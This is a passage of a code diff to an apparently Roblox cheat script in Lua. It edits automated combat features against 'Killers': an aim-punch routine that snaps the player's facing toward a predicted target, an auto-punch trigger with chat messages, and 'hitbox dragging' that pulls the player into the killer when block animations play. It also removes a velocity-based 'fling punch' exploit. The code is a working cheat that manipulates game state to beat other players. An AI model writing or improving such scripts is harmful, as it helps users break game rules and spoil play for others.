                 if bv and bv.Parent then pcall(function() bv:Destroy() end) end
                 humanoid.WalkSpeed = oldWalk
@@ -4051,6 +4043,7 @@ do
             end
             
             if not (char and char.Parent) or not (killerModel and killerModel.Parent) then
+                
                 _hitboxDraggingDebounce = false
                 return
             end
@@ -4059,6 +4052,7 @@ do
                 _hitboxDraggingDebounce = false
                 return
             end
+            
             
             targetHRP = getKillerHRP(killerModel)
             if not targetHRP then
@@ -4069,6 +4063,7 @@ do
             local toTarget = (targetHRP.Position - hrp.Position)
             local dist = toTarget.Magnitude
             
+            
             local horiz = Vector3.new(toTarget.X, 0, toTarget.Z)
             if horiz.Magnitude > 0.01 then
                 local dir = horiz.Unit
@@ -4076,6 +4071,7 @@ do
             else
                 bv.Velocity = Vector3.new(0, bv.Velocity.Y, 0)
             end
+            
             
             local stopDist = 2.0
             if dist <= stopDist then
@@ -4089,8 +4085,7 @@ do
             end
         end)
     end
-    
-    -- Refresh Animator Helper
+
     local function refreshAnimator()
         local char = localPlayer.Character
         if not char then
@@ -4105,21 +4100,19 @@ do
             cachedAnimator = nil
         end
     end
-    
+
     localPlayer.CharacterAdded:Connect(function(char)
         task.wait(0.5)
         refreshAnimator()
     end)
-    
-    -- Block Animation IDs for Hitbox Dragging Detection
+
     local blockAnimIds = {
         "72722244508749",
         "96959123077498",
         "95802026624883"
     }
-    
-    -- Watch for local block animations and trigger drag
-    RunService.RenderStepped:Connect(function()
+
+    RunService.Heartbeat:Connect(function()
         if not hitboxDraggingTech then return end
         if not cachedAnimator then refreshAnimator() end
         local animator = cachedAnimator
@@ -4130,12 +4123,14 @@ do
                 local a = track.Animation
                 return a and tostring(a.AnimationId):match("%d+")
             end)
+            
             if ok and animId and table.find(blockAnimIds, animId) then
                 local timePos = 0
                 pcall(function() timePos = track.TimePosition or 0 end)
                 if timePos <= 0.12 then
                     local nearest = getNearestKillerModel()
                     if nearest then
+                        
                         task.wait(Ddelay)
                         task.spawn(function() beginDragIntoKiller(nearest) end)
                     end
@@ -4143,12 +4138,12 @@ do
             end
         end
     end)
-    
-    -- Blue Parts Detection for Better Detection Mode
+
     local HITBOX_DETECT_RADIUS = 6
     task.spawn(function()
         while true do
             RunService.Heartbeat:Wait()
+            
             if not hitboxDraggingTech then
                 task.wait(0.15)
                 continue
@@ -4158,6 +4153,7 @@ do
             local myRoot = char and char:FindFirstChild("HumanoidRootPart")
             if not myRoot then 
                 task.wait(0.15) 
+                
                 continue 
             end
             
@@ -4173,6 +4169,7 @@ do
             
             if found and not _hitboxDraggingDebounce then
                 local nearest = getNearestKillerModel()
+                
                 if nearest then
                     task.wait(Ddelay)
                     task.spawn(function() beginDragIntoKiller(nearest) end)
@@ -4182,37 +4179,19 @@ do
             task.wait(0.12)
         end
     end)
-    
-    -- Initialize on first load
+
     refreshAnimator()
-    
-    -- Fling Punch Coroutine
+
     coroutine.wrap(function()
         local hrp, c, vel, movel = nil, nil, nil, 0.1
         while true do
             RunService.Heartbeat:Wait()
-            if hiddenfling then
-                while hiddenfling and not (c and c.Parent and hrp and hrp.Parent) do
-                    RunService.Heartbeat:Wait()
-                    c = localPlayer.Character
-                    hrp = c and c:FindFirstChild("HumanoidRootPart")
-                end
-                if hiddenfling then
-                    vel = hrp.Velocity
-                    hrp.Velocity = vel * flingPower + Vector3.new(0, flingPower, 0)
-                    RunService.RenderStepped:Wait()
-                    hrp.Velocity = vel
-                    RunService.Stepped:Wait()
-                    hrp.Velocity = vel + Vector3.new(0, movel, 0)
-                    movel = movel * -1
-                end
-            end
         end
     end)()
-    
-    -- Auto Punch Logic
+
     RunService.RenderStepped:Connect(function()
         if not autoPunchOn then return end
+        if not isMyGuest() then return end
         
         local gui = localPlayer.PlayerGui:FindFirstChild("MainUI")
         local punchBtn = gui and gui:FindFirstChild("AbilityContainer") and gui.AbilityContainer:FindFirstChild("Punch")
@@ -4222,6 +4201,7 @@ do
         
         local myChar = localPlayer.Character
         local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+        
         if not myRoot then return end
         
         for _, name in ipairs(killerNames) do
@@ -4229,41 +4209,28 @@ do
                 and workspace.Players:FindFirstChild("Killers")
                 and workspace.Players.Killers:FindFirstChild(name)
             
-            if killer and killer:FindFirstChild("HumanoidRootPart") then
+            -- FIX: Add check to see if the found model is a killer in the Killers table
+            if killer and Killers[killer.Name] and killer:FindFirstChild("HumanoidRootPart") then
                 local root = killer.HumanoidRootPart
+                
                 if root and (root.Position - myRoot.Position).Magnitude <= detectionRange then
                     fireGuiPunch()
                     
                     if messageWhenAutoPunchOn and messageWhenAutoPunch and messageWhenAutoPunch ~= "" then
                         if tick() - _lastPunchMessageTime > MESSAGE_PUNCH_COOLDOWN then
+                            
                             sendChatMessage(messageWhenAutoPunch)
                             _lastPunchMessageTime = tick()
                         end
                     end
                     
-                    if flingPunchOn then
-                        hiddenfling = true
-                        local targetHRP = root
-                        task.spawn(function()
-                            local start = tick()
-                            while tick() - start < 1 do
-                                if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") and targetHRP and targetHRP.Parent then
-                                    local frontPos = targetHRP.Position + (targetHRP.CFrame.LookVector * 2)
-                                    localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(frontPos, targetHRP.Position)
-                                end
-                                task.wait()
-                            end
-                            hiddenfling = false
-                        end)
-                    end
                     
                     break
                 end
             end
         end
     end)
-    
-    -- Aim Punch Logic
+
     RunService.RenderStepped:Connect(function()
         if not aimPunch then return end
         if not cachedAnimator then refreshAnimator() end
@@ -4279,53 +4246,67 @@ do
                 and workspace.Players:FindFirstChild("Killers")
                 and workspace.Players.Killers:FindFirstChild(name)
             
-            if killer and killer:FindFirstChild("HumanoidRootPart") then
+            -- FIX: Add check to see if the found model is a killer in the Killers table
+            if killer and Killers[killer.Name] and killer:FindFirstChild("HumanoidRootPart") then
                 local root = killer.HumanoidRootPart
+                
                 
                 for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
                     local animId = tostring(track.Animation.AnimationId):match("%d+")
                     if table.find(punchAnimIds, animId) then
                         local last = lastAimTrigger[track]
                         if last and tick() - last < AIM_COOLDOWN then
-                            -- skip
                         else
                             local timePos = 0
                             pcall(function() timePos = track.TimePosition or 0 end)
+                            
                             if timePos <= 0.1 then
                                 lastAimTrigger[track] = tick()
                                 
                                 local humanoid = myChar:FindFirstChild("Humanoid")
+                                
                                 if humanoid then
                                     humanoid.AutoRotate = false
                                 end
                                 
+                                
                                 task.spawn(function()
                                     local start = tick()
+                                    
                                     while tick() - start < AIM_WINDOW do
                                         if myRoot and root and root.Parent then
+                                            
                                             local predictedPos = root.Position + (root.CFrame.LookVector * predictionValue)
                                             myRoot.CFrame = CFrame.lookAt(myRoot.Position, predictedPos)
                                         end
+                                        
                                         task.wait()
                                     end
+                                    
                                     
                                     if humanoid then
                                         humanoid.AutoRotate = true
                                     end
                                     
+                                    
                                     task.delay(AIM_COOLDOWN - AIM_WINDOW, function()
                                         lastAimTrigger[track] = nil
+                                        
                                     end)
                                 end)
                             end
                         end
+                        
                     end
                 end
             end
         end
     end)
-    
 end
+
+
+
+
 
     Tabs.Main:AddSection("c00lkidd")
 
